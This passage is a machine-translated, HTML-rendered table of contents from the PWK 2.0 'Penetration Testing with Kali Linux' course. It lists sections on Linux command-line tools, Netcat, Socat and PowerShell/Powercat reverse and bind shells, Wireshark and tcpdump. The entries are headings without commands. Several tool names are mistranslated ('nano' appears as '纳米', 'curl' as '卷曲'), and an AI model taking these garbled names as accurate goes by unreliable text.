<div style="position:absolute;top:4405;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt-cache 搜索和 apt 显示 ..................................... ...................................................... 46</font></font></nobr></div>
<div style="position:absolute;top:4431;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.4</font></font></nobr></div>
<div style="position:absolute;top:4431;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt 安装 ..................................... ………………………………………………………………………………………………………………………………………………………… ………………………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:4458;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.5</font></font></nobr></div>
<div style="position:absolute;top:4458;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt remove --purge ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 47</font></font></nobr></div>
<div style="position:absolute;top:4485;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.6</font></font></nobr></div>
<div style="position:absolute;top:4485;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 48</font></font></nobr></div>
<div style="position:absolute;top:4512;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.7</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4512;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 48</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行乐趣 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 49</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4565;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4565;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 环境 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 49</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4592;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.1</font></font></nobr></div>
<div style="position:absolute;top:4592;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量 ................................................ ………………………………………………………………………………………………………………………………………………………… ..... 49</font></font></nobr></div>
<div style="position:absolute;top:4619;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.2</font></font></nobr></div>
<div style="position:absolute;top:4619;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡完成 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 51</font></font></nobr></div>
<div style="position:absolute;top:4646;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.3</font></font></nobr></div>
<div style="position:absolute;top:4646;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 历史技巧 ..................................... …………………………………………………………………………………………………………………………………………………………………… …………………… 51</font></font></nobr></div>
<div style="position:absolute;top:4673;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4673;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管道和重定向 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 53</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:4700;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.1</font></font></nobr></div>
<div style="position:absolute;top:4700;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向到新文件 ..................................... ………………………………………………………………………………………………………………………………………………………… .... 53</font></font></nobr></div>
<div style="position:absolute;top:4726;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.2</font></font></nobr></div>
<div style="position:absolute;top:4726;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向到现有文件 ..................................... ...................................................... 54</font></font></nobr></div>
<div style="position:absolute;top:4753;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.3</font></font></nobr></div>
<div style="position:absolute;top:4753;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从文件重定向 ..................................... ………………………………………………………………………………………………………………………………………………………… ....... 54</font></font></nobr></div>
<div style="position:absolute;top:4780;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.4</font></font></nobr></div>
<div style="position:absolute;top:4780;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重定向 STDERR ..................................... ………………………………………………………………………………………………………………………………………………………… ..... 54 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:4927;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4960;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:6037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:6037;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:6037;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5056;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.5</font></font></nobr></div>
<div style="position:absolute;top:5056;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管道 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 55</font></font></nobr></div>
<div style="position:absolute;top:5083;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5083;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文本搜索和操作 ..................................... ...................................................... 55</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5109;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.1</font></font></nobr></div>
<div style="position:absolute;top:5109;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep ................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 55</font></font></nobr></div>
<div style="position:absolute;top:5136;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.2</font></font></nobr></div>
<div style="position:absolute;top:5136;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 56</font></font></nobr></div>
<div style="position:absolute;top:5163;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.3</font></font></nobr></div>
<div style="position:absolute;top:5163;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">切 ................................................. ………………………………………………………………………………………………………………………………………………………… ...................................................... 56</font></font></nobr></div>
<div style="position:absolute;top:5190;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.4</font></font></nobr></div>
<div style="position:absolute;top:5190;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 57</font></font></nobr></div>
<div style="position:absolute;top:5217;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.3.5</font></font></nobr></div>
<div style="position:absolute;top:5217;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际例子 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 57</font></font></nobr></div>
<div style="position:absolute;top:5244;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5244;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从命令行编辑文件 ..................................... ...................................................... 59</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5270;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4.1</font></font></nobr></div>
<div style="position:absolute;top:5270;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纳米 ..................................... ………………………………………………………………………………………………………………………………………………………… ………………………………………………………………………………………………………………………………………………………… 59</font></font></nobr></div>
<div style="position:absolute;top:5297;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.4.2</font></font></nobr></div>
<div style="position:absolute;top:5297;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">六 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 60</font></font></nobr></div>
<div style="position:absolute;top:5324;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5324;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比较文件 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 61</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5351;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.1</font></font></nobr></div>
<div style="position:absolute;top:5351;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交流………………………………………………………………………………………………………………………………………………………… ………………………………………………………………………………………………………………………………………………………… ...................................... 61</font></font></nobr></div>
<div style="position:absolute;top:5378;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.2</font></font></nobr></div>
<div style="position:absolute;top:5378;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">差异 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 62</font></font></nobr></div>
<div style="position:absolute;top:5405;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.3</font></font></nobr></div>
<div style="position:absolute;top:5405;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vimdiff ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 63</font></font></nobr></div>
<div style="position:absolute;top:5432;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5432;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理流程 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 64</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5458;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.1</font></font></nobr></div>
<div style="position:absolute;top:5458;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后台进程 (bg) ..................................... ...................................................... 65</font></font></nobr></div>
<div style="position:absolute;top:5485;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.2</font></font></nobr></div>
<div style="position:absolute;top:5485;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业控制：作业和 fg ..................................... …………………………………………………………………………………………………………………………………………………………………… ..... 65</font></font></nobr></div>
<div style="position:absolute;top:5512;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6.3</font></font></nobr></div>
<div style="position:absolute;top:5512;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程控制：ps 和 kill ...................................... …………………………………………………………………………………………………………………………………………………………………… . 66</font></font></nobr></div>
<div style="position:absolute;top:5539;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5539;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件和命令监控 ..................................... ……………………………………………………………………………………………………………………………………………………………… .. 68</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5566;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7.1</font></font></nobr></div>
<div style="position:absolute;top:5566;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尾巴 ................................................. …………………………………………………………………………………………………………………………………………………………………… ...................................................... 68</font></font></nobr></div>
<div style="position:absolute;top:5593;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.7.2</font></font></nobr></div>
<div style="position:absolute;top:5593;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手表 ................................................. ………………………………………………………………………………………………………………………………………………………… ...................................... 69</font></font></nobr></div>
<div style="position:absolute;top:5619;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5619;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载文件 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 69</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5646;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.1</font></font></nobr></div>
<div style="position:absolute;top:5646;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wget ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 69</font></font></nobr></div>
<div style="position:absolute;top:5673;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.2</font></font></nobr></div>
<div style="position:absolute;top:5673;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卷曲 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 70</font></font></nobr></div>
<div style="position:absolute;top:5700;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.8.3</font></font></nobr></div>
<div style="position:absolute;top:5700;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">轴 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 70</font></font></nobr></div>
<div style="position:absolute;top:5727;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5727;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自定义 Bash 环境 ..................................... ...................................................... 71</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5753;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.1</font></font></nobr></div>
<div style="position:absolute;top:5753;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 历史自定义 ..................................... ...................................................... 71</font></font></nobr></div>
<div style="position:absolute;top:5780;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.2</font></font></nobr></div>
<div style="position:absolute;top:5780;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别名 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 72</font></font></nobr></div>
<div style="position:absolute;top:5807;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.9.3</font></font></nobr></div>
<div style="position:absolute;top:5807;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持久的 Bash 自定义 ..................................... ...................................................... 73</font></font></nobr></div>
<div style="position:absolute;top:5834;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.10</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 74</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用工具 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 75</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5888;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5888;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网猫 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................................... 75</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:5914;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.1</font></font></nobr></div>
<div style="position:absolute;top:5914;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到 TCP/UDP 端口 ..................................... ...................................................... 75</font></font></nobr></div>
<div style="position:absolute;top:5941;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.2</font></font></nobr></div>
<div style="position:absolute;top:5941;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听 TCP/UDP 端口 ..................................... ...................................................... 76</font></font></nobr></div>
<div style="position:absolute;top:5968;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.3</font></font></nobr></div>
<div style="position:absolute;top:5968;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Netcat 传输文件 ..................................... ...................................................... 77 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:6115;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6148;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:7225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:7225;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:7225;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6244;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.4</font></font></nobr></div>
<div style="position:absolute;top:6244;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Netcat 进行远程管理 ..................................... ...................................... 78</font></font></nobr></div>
<div style="position:absolute;top:6271;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6271;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">索卡特 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 82</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6297;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.1</font></font></nobr></div>
<div style="position:absolute;top:6297;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat 与 Socat ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 82</font></font></nobr></div>
<div style="position:absolute;top:6324;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.2</font></font></nobr></div>
<div style="position:absolute;top:6324;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socat 文件传输 ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 82</font></font></nobr></div>
<div style="position:absolute;top:6351;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.3</font></font></nobr></div>
<div style="position:absolute;top:6351;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socat 反向壳 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 83</font></font></nobr></div>
<div style="position:absolute;top:6378;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.4</font></font></nobr></div>
<div style="position:absolute;top:6378;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socat 加密绑定壳............................................................. ...................................................... 83</font></font></nobr></div>
<div style="position:absolute;top:6405;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6405;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 和 Powercat ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 85</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6432;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.1</font></font></nobr></div>
<div style="position:absolute;top:6432;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 文件传输 ..................................... ………………………………………………………………………………………………………………………………………………………… . 87</font></font></nobr></div>
<div style="position:absolute;top:6458;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.2</font></font></nobr></div>
<div style="position:absolute;top:6458;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 反向 Shell ..................................... …………………………………………………………………………………………………………………………………………………………………… 88</font></font></nobr></div>
<div style="position:absolute;top:6485;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.3</font></font></nobr></div>
<div style="position:absolute;top:6485;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 绑定外壳 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 89</font></font></nobr></div>
<div style="position:absolute;top:6512;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.4</font></font></nobr></div>
<div style="position:absolute;top:6512;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电力猫 ..................................... ………………………………………………………………………………………………………………………………………………………… ………………………………………………………………………………………………………………………………………………………… 90</font></font></nobr></div>
<div style="position:absolute;top:6539;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.5</font></font></nobr></div>
<div style="position:absolute;top:6539;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat 文件传输 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 92</font></font></nobr></div>
<div style="position:absolute;top:6566;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.6</font></font></nobr></div>
<div style="position:absolute;top:6566;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat 反向外壳 ..................................... …………………………………………………………………………………………………………………………………………………………………… ... 92</font></font></nobr></div>
<div style="position:absolute;top:6593;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.7</font></font></nobr></div>
<div style="position:absolute;top:6593;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat 绑定壳 ..................................... ……………………………………………………………………………………………………………………………………………………………… ...... 93</font></font></nobr></div>
<div style="position:absolute;top:6620;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.8</font></font></nobr></div>
<div style="position:absolute;top:6620;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat 独立有效负载 ..................................... ...................................................... 93</font></font></nobr></div>
<div style="position:absolute;top:6646;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6646;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark ...................................... ………………………………………………………………………………………………………………………………………………………… ................................................... 95</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6673;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.1</font></font></nobr></div>
<div style="position:absolute;top:6673;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wireshark 基础知识 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 95</font></font></nobr></div>
<div style="position:absolute;top:6700;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.2</font></font></nobr></div>
<div style="position:absolute;top:6700;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 Wireshark ..................................... …………………………………………………………………………………………………………………………………………………………………… ........ 96</font></font></nobr></div>
<div style="position:absolute;top:6727;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.3</font></font></nobr></div>
<div style="position:absolute;top:6727;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获过滤器 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 96</font></font></nobr></div>
<div style="position:absolute;top:6754;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.4</font></font></nobr></div>
<div style="position:absolute;top:6754;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示过滤器 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 97</font></font></nobr></div>
<div style="position:absolute;top:6781;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.5</font></font></nobr></div>
<div style="position:absolute;top:6781;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遵循 TCP 流 ..................................... …………………………………………………………………………………………………………………………………………………………………… ..... 98</font></font></nobr></div>
<div style="position:absolute;top:6807;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6807;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tcpdump ...................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 99</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6834;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5.2</font></font></nobr></div>
<div style="position:absolute;top:6834;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过滤流量 ..................................... ……………………………………………………………………………………………………………………………………………………………… ……………… 100</font></font></nobr></div>
<div style="position:absolute;top:6861;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.5.3</font></font></nobr></div>
<div style="position:absolute;top:6861;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级标题过滤 ..................................... ...................................................... 102</font></font></nobr></div>
<div style="position:absolute;top:6888;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6888;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 104</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................................... 105</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6941;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6941;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本简介 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 105</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6968;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6968;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 106</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:6995;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2.1</font></font></nobr></div>
